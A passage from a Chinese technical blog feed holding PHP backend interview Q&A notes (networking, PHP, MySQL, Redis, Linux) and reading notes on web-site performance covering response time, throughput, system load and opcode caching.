cookie 的区别"></a>session 和 cookie 的区别</h3><ol><li>存储方式不同：cookie 是存储在客户端，session 则是存储在服务端。</li><li>隐私策略不同：cookie 因为存储在客户端中，所以对客户端是可见的，而session </li></ol><h3 id="UDP-和TCP-的区别"><a href="#UDP-和TCP-的区别" class="headerlink" title="UDP 和TCP 的区别"></a>UDP 和TCP 的区别</h3><p>UDP 是面向报文的、不可靠的数据报协议，TCP 是面向连接的、可靠的流协议。</p><ol><li>TCP 面向连接; UDP 不需要连接，即发送数据之前不需要建立连接;</li><li>TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达; UDP尽最大努力交付，即不保保证可靠交付</li><li>TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流; UDP是面向报文的，UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低</li><li>每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信</li><li>TCP首部开销20字节;UDP的首部开销小，只有8个字节</li><li>TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道</li></ol><blockquote><p>说一说TCP 的“粘包”问题</p></blockquote><p>结论：TCP 的“粘包”问题其实是一个伪命题。</p><p>服务端建立服务，客户端发起连接，正常情况下，服务端每次send，客户端都能正常recv，但在并发的情况下，服务端的两次send或者多次send，客户端可能只有一次recv了。这就导致了所谓的“粘包”问题的产生。</p><p>TCP 协议的本质是流协议，它只会保证以什么顺序发送字节，接受方就一定能按照这个顺序接收到，所以所谓的粘包问题不应该是传输层面的问题，而是应用层面的问题。</p><h3 id="简述TCP-三次握手"><a href="#简述TCP-三次握手" class="headerlink" title="简述TCP 三次握手"></a>简述TCP 三次握手</h3><p>概念：指在发送数据的准备阶段，服务器和客户端之间需要三次交互。</p><p>第一次握手：客户端向服务端发送一个SYN包，并进入SYN_SENT 状态，等待服务端确认<br>第二次握手：当服务器收到请求之后，此时要给客户端一个确认信息ACK，同时发送SYN报，此时服务器进入 SYN_RECV 状态<br>第三次握手：客户端收到服务器发的ACK + SYN 包后，向服务器发送ACK，发送完毕之后，客户端和服务器进入TCP 连接成功状态，完成三次握手。</p><blockquote><p>为什么握手一定要三次，不能两次吗？</p></blockquote><p>这是为了防止已经失效的连接请求报文突然又传到Tcp 服务器，避免产生错误。</p><h3 id="简述TCP-四次挥手"><a href="#简述TCP-四次挥手" class="headerlink" title="简述TCP 四次挥手"></a>简述TCP 四次挥手</h3><p>概念：所谓四次挥手就是说关闭TCP 连接的过程，当断开一个TCP 连接时，需要客户端和服务器共共发送四个包确认。</p><p>第一次挥手：客户端发送一个FIN，用来关闭客户端到服务器的数据传输，客户端进入 fin_wait 状态<br>第二次挥手：服务器收到fin 后，发送一个ack 给客户端，确认序号为收到序号+1，服务器进入close_wait 状态<br>第三次挥手：服务器发送一个fin 用来关闭服务器到客户端的数据传输，服务器进入 last_ack 状态<br>第四次挥手：客户端收到fin 后，客户端进入time_wait 状态，接着发送一个ack 给服务器，确认序号为收到序号+1，服务器进入 closed 状态，完成四次挥手。</p><h3 id="建立socket-需要哪些步骤"><a href="#建立socket-需要哪些步骤" class="headerlink" title="建立socket 需要哪些步骤"></a>建立socket 需要哪些步骤</h3><ul><li>创建socket</li><li>绑定socket 到指定地址和端口</li><li>开始监听连接</li><li>读取客户端输入</li><li>关闭 socket</li></ul><h3 id="简述从浏览器输入-a-com-回车之后发生了什么"><a href="#简述从浏览器输入-a-com-回车之后发生了什么" class="headerlink" title="简述从浏览器输入 a.com 回车之后发生了什么"></a>简述从浏览器输入 a.com 回车之后发生了什么</h3><ol><li>DNS 域名解析，寻找对应的IP 地址</li><li>根据这个IP 找到对应的服务器，建立TCP 连接（三次握手）</li><li>TCP 建连之后，发起HTTP 请求</li><li>服务器响应 HTTP 请求</li><li>客户端接收数据解析并渲染页面</li><li>服务器关闭TCP 连接（四次挥手）</li></ol><h3 id="长连接与短连接的区别"><a href="#长连接与短连接的区别" class="headerlink" title="长连接与短连接的区别"></a>长连接与短连接的区别</h3><p>短连接为每一次的数据传输准备了一个传输通道，而长连接则是建立一条通道，并一直保持，每一次传输时都会复用同一条连接通道。</p><h3 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h3><p>Websocket 是一种通信协议，连接刚开始还是HTTP 协议，由客户端发起，然后切换成Websocket 协议。</p><p>它的存在，由轮询变成了客户端可以主动向服务端发送消息。</p><blockquote><p>什么是轮询？</p></blockquote><p>轮询是一种获取信息的方式。</p><h2 id="PHP篇"><a href="#PHP篇" class="headerlink" title="PHP篇"></a>PHP篇</h2><h3 id="值传递和引用传递的区别"><a href="#值传递和引用传递的区别" class="headerlink" title="值传递和引用传递的区别"></a>值传递和引用传递的区别</h3><p>值传递：传递的是变量在内存中的副本。<br>引用传递：传递的是变量在内存中的地址。</p><p>unset 并不会真正意义上注销一个变量，而是切断了变量名和实际值之间的关系，其变量只要还被引用就还没有被释放。</p><h3 id="composer-自动加载原理"><a href="#composer-自动加载原理" class="headerlink" title="composer 自动加载原理"></a>composer 自动加载原理</h3><p>composer 的核心加载思想是通过composer 的<code>autoload.php</code>，将类和路径的对应关系加载到内存中，最后将具体的加载实现注册到 <code>spl_autoload_register</code> 函数中。</p><h3 id="常用的请求第三方接口有哪几种方式？"><a href="#常用的请求第三方接口有哪几种方式？" class="headerlink" title="常用的请求第三方接口有哪几种方式？"></a>常用的请求第三方接口有哪几种方式？</h3><ol><li><code>curl</code></li><li><code>file_get_contents</code></li><li><code>fopen</code></li></ol><h3 id="抽象类和接口类的区别"><a href="#抽象类和接口类的区别" class="headerlink" title="抽象类和接口类的区别"></a>抽象类和接口类的区别</h3><p>抽象用于描述不同的事物，接口用于描述事物的行为</p><h3 id="进程与线程的区别"><a href="#进程与线程的区别" class="headerlink" title="进程与线程的区别"></a>进程与线程的区别</h3><p>进程是CPU 分配内存的最小单位，线程是CPU 调度的最小单位，一个进程可以有多个线程，一个线程只能有一个进程。</p><h3 id="Swoole-的进程模型"><a href="#Swoole-的进程模型" class="headerlink" title="Swoole 的进程模型"></a>Swoole 的进程模型</h3><p>Swoole 的进程模型采用主进程、管理进程、异步任务/工作进程协作的方式。</p><ul><li>Manager 进程主要负责创建/回收 worker/task 进程</li><li>Reactor 进程主要负责维护客户端 TCP 连接、处理网络 IO、处理协议、收发数据</li><li>Worker/Task 进程主要负责执行PHP 代码。</li></ul><h3 id="PHP-的进程模型"><a href="#PHP-的进程模型" class="headerlink" title="PHP 的进程模型"></a>PHP 的进程模型</h3><p>在LNMP 的模式下，PHP 是php-fpm 多进程+阻塞I/O 的进程模型。</p><h3 id="同步、异步、阻塞、非阻塞是怎么回事？"><a href="#同步、异步、阻塞、非阻塞是怎么回事？" class="headerlink" title="同步、异步、阻塞、非阻塞是怎么回事？"></a>同步、异步、阻塞、非阻塞是怎么回事？</h3><ul><li>同步和异步是一种消息通信机制。</li><li>阻塞和非阻塞是一种业务流程处理方式。</li><li>IO 多路复用：用一个线程来检查Socket 的就绪状态。</li></ul><h3 id="并发、并行有什么区别？"><a href="#并发、并行有什么区别？" class="headerlink" title="并发、并行有什么区别？"></a>并发、并行有什么区别？</h3><p>并发：两件或者多件事情在同一时间间隔内发生<br>并行：两件或者多件事情在同一时刻发生</p><p>区别在与：在同一个时刻，对于并行来说，事件是一并发生，而对于并发来说，在宏观看来也是一并发生，但在微观上却是交替发生。</p><h3 id="简述PHP-代码解析过程"><a href="#简述PHP-代码解析过程" class="headerlink" title="简述PHP 代码解析过程"></a>简述PHP 代码解析过程</h3><p>Zend 引擎首先会将PHP 代码进行解析（词法、语法解析）成 opcode，然后Zend 虚拟机会顺序执行这些指令。</p><h3 id="从LNMP-的角度简述一次完整的请求过程"><a href="#从LNMP-的角度简述一次完整的请求过程" class="headerlink" title="从LNMP 的角度简述一次完整的请求过程"></a>从LNMP 的角度简述一次完整的请求过程</h3><p>当客户端发起一个请求到服务端，Web Server 首先会判断该请求是静态还是动态？<br>如果是静态，直接返回对应的静态资源。<br>如果是动态，FastCGI 会将该请求转发给本地 9000 端口（9000 是 PHP—FPM 所监听的端口），PHP-FPM 主进程接收到请求之后，<br>会分配一个空闲的 Worker 进程去处理这个请求，处理完成之后将数据返回给 FastCGI，再由 Nginx 返回给客户端。</p><h3 id="PHP-可以做常驻内存吗？为什么？"><a href="#PHP-可以做常驻内存吗？为什么？" class="headerlink" title="PHP 可以做常驻内存吗？为什么？"></a>PHP 可以做常驻内存吗？为什么？</h3><p>传统的PHP 无法以常驻内存的方式运行，这是因为PHP是解释型脚本语言，这种运行机制使得每个PHP 页面解释执行后，所有资源都被回收了。</p><h3 id="通常如何实现用户登录（API）"><a href="#通常如何实现用户登录（API）" class="headerlink" title="通常如何实现用户登录（API）"></a>通常如何实现用户登录（API）</h3><p>有两种方式：一种是普通的 token 令牌，另一种则是JWT。</p><p>普通Token：<br>用户初次登录会携带用户名和密码等信息，服务端验证通过之后，会给客户端返回一个Token。<br>这个Token 可以是由用户名、密码、登录设备、登录IP 等信息加密之后组成，<br>以后的客户端每一次请求都会携带这个Token，服务端则会验证该Token。</p><h3 id="在PHP中，你是如何捕获异常的？"><a href="#在PHP中，你是如何捕获异常的？" class="headerlink" title="在PHP中，你是如何捕获异常的？"></a>在PHP中，你是如何捕获异常的？</h3><p>尽量避免使用<code>exit</code>、<code>die</code>方法直接退出，而使用<code>try...catch</code>来捕获异常。</p><h3 id="常见设计模式"><a href="#常见设计模式" class="headerlink" title="常见设计模式"></a>常见设计模式</h3><p>创造型：工厂模式、单例模式、原型模式<br>结构型：适配器模式、装饰模式、门面模式、代理模式<br>行为型：迭代器模式、中介模式、观察者模式</p><h3 id="什么是依赖注入"><a href="#什么是依赖注入" class="headerlink" title="什么是依赖注入"></a>什么是依赖注入</h3><p>依赖注入主要用来减少代码间的耦合，有效分离对象和它所需要的外部资源。</p><h2 id="Mysql篇"><a href="#Mysql篇" class="headerlink" title="Mysql篇"></a>Mysql篇</h2><p>Mysql 的InnoDb 和MyISAM 引擎有何不同？</p><ul><li>InnoDb 的特点包括：事务、锁</li><li>InnoDb 支持 ACID 的事务 4个特性，MyISAM 不支持事务。</li><li>InnoDB 支持行级别的锁粒度，MyISAM 不支持，只支持表级别的锁粒度。</li></ul><h3 id="什么是ACID（事务的四个特性）？"><a href="#什么是ACID（事务的四个特性）？" class="headerlink" title="什么是ACID（事务的四个特性）？"></a>什么是ACID（事务的四个特性）？</h3><ul><li>原子性（Atomicity）：事务的所有操作，要么全部完成，要么全部不完成，不会结束在某个中间环节。</li><li>一致性（Consistency）：事务开始之前和事务结束之后，数据库的完整性限制未被破坏。</li><li>隔离性（Isolation）：两个或者多个事务的执行是互不干扰的，一个事务不可能看到其他事务运行时，中间某一时刻的数据。</li><li>持久性（Durability）：事务完成之后，事务所做的修改进行持久化保存，不会丢失。</li></ul><h3 id="Mysql-有几种事务隔离级别？"><a href="#Mysql-有几种事务隔离级别？" class="headerlink" title="Mysql 有几种事务隔离级别？"></a>Mysql 有几种事务隔离级别？</h3><p>有四种隔离级别。</p><h3 id="死锁是什么？"><a href="#死锁是什么？" class="headerlink" title="死锁是什么？"></a>死锁是什么？</h3><p>两个或多个事务在同一个资源上相互占用。</p><h3 id="简述Mysql-索引、主键及其常见索引"><a href="#简述Mysql-索引、主键及其常见索引" class="headerlink" title="简述Mysql 索引、主键及其常见索引"></a>简述Mysql 索引、主键及其常见索引</h3><p>索引就是类似于书籍目录的存在，主键是用于确定字段的唯一性。</p><ul><li>普通索引：最普通的索引，使用没有什么限制。</li><li>唯一索引：与普通索引类型，唯一不同的是，列值不允许重复，但允许有空值。</li><li>主键索引：主键本身自带的索引，不允许有空值。</li><li>全文索引：仅可用于 MyISAM 表，针对较大的数据，生成全文索引很耗时占空间</li><li>组合索引：为了提高多条件查询效率，可建立组合索引，遵循”最左前缀匹配原则”</li></ul><p>但是索引也不是越多越好，索引加快了查询速度，但同时也会影响更新速度。</p><h2 id="Redis篇"><a href="#Redis篇" class="headerlink" title="Redis篇"></a>Redis篇</h2><h3 id="Redis-和Memcache-的区别"><a href="#Redis-和Memcache-的区别" class="headerlink" title="Redis 和Memcache 的区别"></a>Redis 和Memcache 的区别</h3><ul><li>Redis 支持多种数据类型，Memcache 只支持Key-Value</li><li>Redis 支持两种持久化，Memcache 不支持持久化。</li></ul><h3 id="Redis-的常见数据结构及其应用场景"><a href="#Redis-的常见数据结构及其应用场景" class="headerlink" title="Redis 的常见数据结构及其应用场景"></a>Redis 的常见数据结构及其应用场景</h3><ul><li>字符串</li><li>哈希</li><li>列表</li><li>无序列表</li><li>集合</li></ul><h3 id="Redis-的持久化有几种方案？"><a href="#Redis-的持久化有几种方案？" class="headerlink" title="Redis 的持久化有几种方案？"></a>Redis 的持久化有几种方案？</h3><p>有三种，分别是：RDB、AOF、混合。</p><ol><li>RDB：将某一时刻的数据以二进制形式写入到磁盘里，服务重启时检测到对应文件自动加载进行数据恢复，有手动触发和自动触发两种机制。</li><li>AOF：以文件追加的方式写入客户端执行的写命令，数据恢复时，通过创建伪客户端的方式执行命令，直到恢复完成。</li><li>混合：在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。</li></ol><h3 id="为什么Redis-是单线程？"><a href="#为什么Redis-是单线程？" class="headerlink" title="为什么Redis 是单线程？"></a>为什么Redis 是单线程？</h3><h2 id="Linux篇"><a href="#Linux篇" class="headerlink" title="Linux篇"></a>Linux篇</h2><h3 id="说一下你常用的Linux-命令（最基础的不用说）"><a href="#说一下你常用的Linux-命令（最基础的不用说）" class="headerlink" title="说一下你常用的Linux 命令（最基础的不用说）"></a>说一下你常用的Linux 命令（最基础的不用说）</h3><ul><li>网络：<code>ping</code>、<code>tcpping</code>、<code>telnet</code>、<code>netstat</code>、<code>nmap</code>、<code>lsof</code>、<code>tcpdump</code></li><li>磁盘：<code>df</code>、<code>du</code></li><li>进程：<code>ps</code>、<code>pstree</code></li><li>内存：<code>free</code></li><li>负载：<code>top</code></li><li>压测工具：<code>ab</code>、<code>wrk</code></li><li>文件上传/下载：<code>curl</code>、<code>wget</code>、<code>scp</code></li><li>综合：<code>glances</code></li></ul><h3 id="基本的运维需要监控哪些数据？"><a href="#基本的运维需要监控哪些数据？" class="headerlink" title="基本的运维需要监控哪些数据？"></a>基本的运维需要监控哪些数据？</h3><ul><li>系统层：CPU、内存、负责、网卡、I/O</li><li>应用层：QPS、API响应时长、Redis内存使用量、任务队列数、php-fpm 进程数、Mysql线程数</li><li>健康巡查：dns 解析、ip 是否可以访问、硬盘、各种基础服务</li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="说一说你所知道的网站攻击方式及如何防范"><a href="#说一说你所知道的网站攻击方式及如何防范" class="headerlink" title="说一说你所知道的网站攻击方式及如何防范"></a>说一说你所知道的网站攻击方式及如何防范</h3><ul><li>CSRF 跨站伪造请求</li><li>XSS 跨站脚本攻击</li><li>SQL 注入</li><li>DDOS 攻击</li></ul><h3 id="如果用户反馈网站慢，你会怎样做？"><a href="#如果用户反馈网站慢，你会怎样做？" class="headerlink" title="如果用户反馈网站慢，你会怎样做？"></a>如果用户反馈网站慢，你会怎样做？</h3><ol><li>资源加载慢<br>i. WebServer 配置静态资源缓存、动静分离<br>ii. DNS 缓存、CDN 加速<br>iii. 增加服务器带宽</li><li>SQL 查询慢<br>i. Mysql 慢查询找出耗时SQL<br>ii. Explain 分析耗时原因<br>iii. 优化SQL</li><li>并发<br>i. 优化PHP-FPM 配置</li></ol><h3 id="如果你发现你部署的网站打不开了，你会如何排查？"><a href="#如果你发现你部署的网站打不开了，你会如何排查？" class="headerlink" title="如果你发现你部署的网站打不开了，你会如何排查？"></a>如果你发现你部署的网站打不开了，你会如何排查？</h3><ol><li>首先检查DNS 解析<br>i. 检查域名解析<br>ii. 排除浏览器缓存</li><li>检查防火墙<br>i. 防火墙是否开启？<br>ii. 端口是否可以正常访问，通常使用telnet 命令检查</li><li>根据网站返回状态码，具体分析<br>i. 404：访问资源不存在<br>ii. 500：服务端错误（代码错误、文件权限）<br>iii. 502：网关错误（webserver 异常导致，Nginx/Apache 发生错误）<br>iiii. 504：网关超时</li><li>查看对应的日志</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/colinlet/PHP-Interview-QA" target="_blank" rel="noopener">PHP面试问答</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;年前年后这段时间一直在为面试做准备，本文将从网络、PHP、Mysql、Redis、Linux 这几部分整理一下常见的一些面试简答题。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="面试" scheme="https://www.0x2beace.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>《构建高性能 Web 站点》读书笔记</title>
    <link href="https://www.0x2beace.com/building-a-high-performance-web-site-reading-notes/"/>
    <id>https://www.0x2beace.com/building-a-high-performance-web-site-reading-notes/</id>
    <published>2021-02-06T15:49:18.000Z</published>
    <updated>2021-02-07T10:55:17.460Z</updated>
    
    <content type="html"><![CDATA[<p>《构建高性能 Web 站点》读书笔记</p><a id="more"></a><h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><h3 id="等待的真相"><a href="#等待的真相" class="headerlink" title="等待的真相"></a>等待的真相</h3><p>当在浏览器中输入了一个地址，直到浏览器返回页面之前的那段时间里，都发生了一些什么呢？</p><p>大概经历了以下几部分时间：</p><ul><li>数据在网络上传输的时间<ul><li>客户端（浏览器）发出请求数据到达服务器的时间</li><li>服务端（服务器）响应数据经过网络到达客户端的时间</li></ul></li><li>站点服务器处理请求并生成响应数据的时间</li><li>浏览器本地计算和渲染的时间</li></ul><p>“数据在网络上传输的时间”我们通常称之为<strong>响应时间</strong>，它的决定因素主要包括发送的数据量和网络宽带。</p><p>站点服务器处理请求并生成响应数据的时间主要消耗在服务端，其中包括非常多的环节，我们一般用另一个指标来衡量这部分时间，即每秒处理请求数，也称吞吐率，这里的吞吐率并不是指单位时间内处理的数据量，而是请求数。影响服务器吞吐率的因素非常多，比如：服务器的并发策略、I/O 模型、I/O 性能、CPU 核数等，当然也包括应用程序本身的逻辑复杂度等。</p><p>浏览器本地计算和渲染的时间自然消耗在浏览器端，它依赖的因素包括浏览器采用的并发策略、样式渲染方式、脚本解释器的性能、页面大小、页面组件（图片、CSS、JS等）数量、页面组件缓存状况、页面组件域名分布及DNS 解析等。</p><h2 id="数据得网络传输"><a href="#数据得网络传输" class="headerlink" title="数据得网络传输"></a>数据得网络传输</h2><p>因为大多数开发者生活在应用层，这些似乎与他们毫无关系，然而一旦当你开始将注意力转向站点性能时，这些基础知识便是你不能不知道的。</p><blockquote><p>如何计算响应时间</p></blockquote><p>响应时间 = 发送时间 + 传播时间 + 处理时间</p><p>发送时间很容易计算，即”数据量/宽带“，比如要发送100Mbit 的数据，而且发送速度为 100Mbit/s，也就是宽带为 100M，那么发送时间便为 1s。值得注意的是，在两台主机之间往往存在多个交换节点，每次的数据转发，都需要花费发送时间，那么总的发送时间也包括这些转发时所花费的发送时间。</p><p>传播时间主要依赖于传播距离，因为传播速度我们可以近似认为约等于 2.0x10<sup>8</sup>m/s，那么传播时间便等于传播距离除以传播速度。比如两个交换节点之前线路的长度为 1000km，相当于北京到上海的直线距离，那么一个比特信号从线路的一端到另一端的传播时间为 0.005s。</p><p>处理时间就是指数据在交换节点中为存储转发而进行一些必要的处理所花费的时间，其中的重要组成部分就是数据在缓冲区队列中排队所发送的时间。注意，准确地说应该是”你的数据“在队列中排队所花费的时间，因为在队伍中还有其他与你毫不相干的数据。</p><p>如果全世界只有你的服务器和你的用户在传输数据，那么用于排队处理时间可以忽略。</p><p>那么，我们可将响应时间的计算公式整理为：<br>响应时间 = （数据量比特数 / 带宽）+ （传播距离 / 传播速度）+ 处理时间</p><p>另外，下载速度的计算公式如下：<br>下载速度 = 数据量字节数 / 响应时间</p><h2 id="服务器并发处理能力"><a href="#服务器并发处理能力" class="headerlink" title="服务器并发处理能力"></a>服务器并发处理能力</h2><p>吞吐率指的是单位时间内服务器的请求数。</p><p>吞吐率是指在一定并发用户数的情况下，服务器处理请求能力的量化体现。</p><p>我们要统计吞吐率，便存在一些潜在的前提，那就是压力的描述和请求性质的描述。</p><p>压力的描述一般包括两部分，即并发用户数和总请求数，也就是模拟多少个用户同时向服务器发送多少个请求。</p><p>请求性质则是堆请求的URL 所代表的资源的描述，比如 1KB 大小的静态文件，或者包含10 次数据库查询的动态内容等。</p><p>所以，吞吐率的前提包括如下几个条件：</p><ul><li>并发用户数</li><li>总请求数</li><li>请求资源描述</li></ul><h2 id="CPU-并发计算"><a href="#CPU-并发计算" class="headerlink" title="CPU 并发计算"></a>CPU 并发计算</h2><p>服务器之所以可以同时处理多个请求，在于操作系统通过多执行流体希设计使得多个任务可以轮流使用系统资源，这些资源包括CPU、内存以及I/O 等。</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>事实上，大多数进程的时间都主要消耗在了I/O操作上，现代计算机的DMA（Direct Memory Access 直接内存访问）技术可以让CPU 不参与I/O 操作的全过程，比如进程通过系统调用，使得CPU 向网卡或者磁盘等 I/O 设备发出指令，然后进程被挂起，释放出CPU 资源，等待 I/O 设备完成工作后通过中断来通知进程重新就绪。</p><p>每个进行都有自己独立的内存地址空间和生命周期。当子进程被父进程创建后，便将父进程地址空间的所有数据复制到自己的地址空间，完全继承父进程的所有上下文信息，它们之间可以通信，但是不互相依赖，也无权干涉彼此的地址空间。</p><h3 id="进程调度器"><a href="#进程调度器" class="headerlink" title="进程调度器"></a>进程调度器</h3><p>在单CPU 的机器上，虽然我们感觉到很多任务在同时运行，但是从微观意义上讲，任何时刻只有一个进程处于运行状态，而其他的进程有的处于挂起状态并等待就绪，有的已经就绪但等待CPU 时间片，还有的处于其他状态。</p><p>内核中的进程调度器（Scheduler）维护着各种状态的进程队列。在 Linux 中，进程调度器维护着一个包括所有可运行进程的队列，称为“运行队列（Run Quere）”，以及一个包括所有休眠进程和僵尸进程的列表。</p><p>进程调度器的一项重要工作就是决定下一个运行的进程，如果运行队列中有不止一个进程，那就比较伤脑筋了，按照先来后到的顺序也许不是那么合理，因为运行在系统中的进程有着不同的工作需要，比如有些进程需要处理紧急的事件，有些进程只是在后台发送不太紧急的邮件，所以每个进程需要告诉进程调度器它们的紧急程度，这就是<strong>进程优先级</strong>。</p><h3 id="系统负载"><a href="#系统负载" class="headerlink" title="系统负载"></a>系统负载</h3><p>在进程调度器维护的运行队列中，任何时刻至少存在一个进程，那就是正在运行的进程。<br>而当运行队列中有不止一个进程的时候，就说明此时CPU 比较抢手，其他进程还在等着呢，进程调度器应该尽快让正在运行的进程释放CPU。</p><p>通过在任何时刻查看 <code>/proc/loadavg</code>，可以了解到运行队列的情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@localhost:~$ cat &#x2F;proc&#x2F;loadavg </span><br><span class="line">4.28 4.05 4.02 4&#x2F;482 6246</span><br></pre></td></tr></table></figure><p>注意 <code>4/482</code>这部分，其中的 4 代表此时运行队列中的进程个数，而 482 则代表此时的进程总数。</p><p>最右边的 6246 代表到此时为止，最后创建的一个进程ID。</p><p>接下来，左边的三个数值，分别是 4.28、4.05、4.02，它们就是我们常说的系统负载。<br>我们都知道，系统负载越高，代表CPU 越繁忙，越无法很好地满足所有进程的需要。</p><p>但是，系统负载是如何计算而来的呢？根据定义，它是在单位时间内运行队列中就绪等待的进程数平均值，所以当运行队列中就绪进程不需要等待就可以马上获得CPU 的时候，系统负载便非常低。当系统负载为 0.00 时，说明任何进程只要就绪后就可以马上获得 CPU，不需要等待，这时候系统响应速度最快。</p><p>那么，刚才提到的三个数值，便是系统最近 1 分钟、5 分钟、15 分钟分别计算得出的系统负载。</p><p>我们还可以通过其他方法获得系统负载，比如top、w 等工具，从实现方法上看，这些工具获得的系统负载都是来源于 <code>/proc/loadavg</code>。</p><p>了解了这些内容后，要想提高服务器的系统负载，很简单，只需要编写一个没有任何 I/O 操作并且长时间占用 CPU 时间的PHP 脚本，比如一个循环累加器，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$max &#x3D; 100000000;</span><br><span class="line">$sum &#x3D; 0;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $max; ++$i)&#123;</span><br><span class="line">  $sum +&#x3D; $i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure><p>然后用100 个并发用户请求这个脚本，进行压力测试，这时候查看系统负载就会看到如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load average: 98.26, 45.89, 17.94</span><br></pre></td></tr></table></figure><h3 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h3><p>所以，如果我们希望服务器支持较大的并发数，那么就要尽量减少上下文切换次数，最简单的做法就是减少进程数，尽量使用线程并配合其他I/O 模型来设计并发策略。</p><h2 id="I-O模型"><a href="#I-O模型" class="headerlink" title="I/O模型"></a>I/O模型</h2><p>对于网络 I/O和磁盘 I/O，它们的速度要慢很多。这些I/O 操作需要由内核系统调用来完成，同时系统调用显然需要CPU 来调度，而CPU 的速度毫无疑问是非常快的，这就使得CPU 不得不浪费宝贵的时间来等待慢速I/O 操作。</p><p>尽管我们通过多进程等方式来充分利用空闲的CPU 资源，但我们还是希望能够让CPU 花费足够少的时间在I/O 操作的调度上，这样就可以腾出更多的CPU 时间来完成更多的I/O 操作。</p><h3 id="PIO与DMA"><a href="#PIO与DMA" class="headerlink" title="PIO与DMA"></a>PIO与DMA</h3><p>在介绍I/O 模型之前，有必要简单地说说慢速I/O 设备和内存之间的数据传输方式。</p><p>我们拿磁盘来说，很早以前，磁盘和内存之间的数据传输是需要CPU 控制的，也就是说如果我们读取磁盘文件到内存中，数据要经过CPU 存储转发，这种方式称为 PIO。显然这种方式非常不合理，需要占用大量的CPU 时间来读取文件，造成文件访问时系统几乎停止响应。</p><p>后来，DMA（Direct Memory Access 直接内存访问）取代了PIO，它可以不经过CPU 而直接进行磁盘和内存的数据交换。在DMA 模式下，CPU 只需要向DMA 控制器下达指令，让DMA 控制器来处理数据的传输即可，DMA 控制器通过系统总线来传输数据，传送完毕再通知CPU，这样就很大程度上降低了CPU 占有率，大大节省了系统资源，而它的传输速度与PIO 的差异并不是十分明显，因为这主要取决于慢速设备的速度。</p><h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>缓存更加注重的是策略，也就是说缓存命中率，如果每次都能在缓存中找到需要的数据，那是最理想的结果，如果每次都在缓存中找不到需要的数据，那么缓存将变得毫无价值。</p><p>解释器核心引擎根本看不懂这些脚本代码，无法直接执行，所以需要进行一系列的代码分析工作，当解释器完成对脚本代码的分析后，便将它们生成可以直接运行的中间代码，也称为操作码（Operate Code，opcode）。</p><p>对于解释型语言而言，从程序代码到中间代码的这个过程，我们称为解释（parse），它由解释器来完成。对于编译型语言而言，从程序代码到中间代码的这个过程称为编译（compile）。</p><p>编译器和解释器的一个本质区别在于，解释器生成中间代码后，便直接执行它，所以运行时的控制权在解释器; 而编译器则将中间代码进一步优化，生成可以直接运行的目标程序，但不执行它，用户可以在随后的任意时间执行它，这时控制权在目标程序，和编译器没有任何关系。</p><p>事实上，就解释和编译本身而言，它们的原理是相似的，都包括词法分析、语法分析、语义分析等。</p><p>为什么开启 opcode，对性能的提升会巨大？<br>这是因为 PHP 在动态解析语法的过程中，会生成操作码，而打开opcode 缓存，就可以避免重复编译。</p><p>当然，并不是所有的动态内容都在应用了 opcode cache 之后有大幅度的性能提升，因为 opcode cache 的目的是减少CPU 和内存开销，如果动态内容的性能瓶颈不在于CPU 和内存，而在于I/O 操作，比如数据库查询带来的磁盘I/O 开销，那么opcode cache 的性能提升是非常有限的。</p><h2 id="有意义的问题"><a href="#有意义的问题" class="headerlink" title="有意义的问题"></a>有意义的问题</h2><p>Q：假如100 个用户同时向服务器分别进行 10次请求，与 1 个用户向服务器连续进行 1000 次请求，效果一样吗？也就是说给服务器带来的压力一样吗？<br>A：虽然看起来服务器都需要连续处理 1000 个请求，其实关键的区别就在于，是否真的”连续“。<br>首先有一点需要明白，对于压力测试中提到的每一个用户，连续发送请求实际上是指在发送一个请求并接受到响应数据后再发送下一个请求，这样一来，从微观层面来看，1 个用户向服务器连续进行 1000次请求的过程中，任何时刻服务器的网卡接收缓冲区中只有来自该用户的 1 个请求，而 100 个用户同时向服务器分别进行 10 次请求的过程中，服务器网卡接收缓冲区最多有 100 个等待处理的请求，显然这时服务器的压力更大。</p><p>Q：关于worker 进程的数量，既然可以由我们来设置，那么是不是越多越好呢？<br>A：显然不是，任何时刻从CPU 的角度来看，只有一个进程在运行。没有一个绝对的公式来告诉你如何选择worker 进程数，需要根据实际情况具体分析和调整。</p><p>Q：7ms 意味着什么呢？<br>A：一个比特通过光纤从北京传到西安，理论上只需要 5ms; 25 